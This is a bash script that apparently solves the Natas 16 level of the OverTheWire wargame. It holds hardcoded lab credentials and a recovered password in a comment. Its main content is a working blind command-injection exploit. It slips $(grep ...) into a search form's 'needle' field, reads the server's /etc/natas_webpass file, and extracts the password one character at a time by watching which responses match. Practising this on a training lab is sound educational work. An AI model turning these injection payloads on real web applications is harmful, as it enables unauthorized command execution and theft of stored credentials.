#! /bin/bash


url='http://natas16.natas.labs.overthewire.org'
user='natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
dataPart1='needle=^$(grep '
dataPart2=' /etc/natas_webpass/natas17)abstractions&submit=search'
passwd=''

alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passwdChars=""
for i in $(seq 1 ${#alphabet})
  do
   data="$dataPart1"${alphabet:i-1:1}"$dataPart2"  
   result=$(curl -s -u $user $url --data "$data" )
   result=$(echo "$result" | grep 'abstractions' | wc -l)
   if [[ $result = 0 ]]
      then passwdChars+="${alphabet:i-1:1}"
   fi
  done

echo "Chars in passwd: $passwdChars"

dataPart1='needle=^$(grep ^'
dataPart2='.* /etc/natas_webpass/natas17)abstractions&submit=search'

for ((i=0; i < 32; i++))
  do
  for j in $(seq 1 ${#passwdChars})
    do
     char="${passwdChars:j-1:1}"
     data="$dataPart1"$char"$dataPart2"  
     result=$(curl -s -u $user $url --data "$data" )
     result=$(echo "$result" | grep 'abstractions' | wc -l)
     if [[ $result = 0 ]]
        then passwd+="$char"
             dataPart1+="$char"
             break
    fi
    done
  echo  "Wow! We got char #$i: $passwd"
  done

echo "Well done, comrad! Here is you key - ""$passwd"
#8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
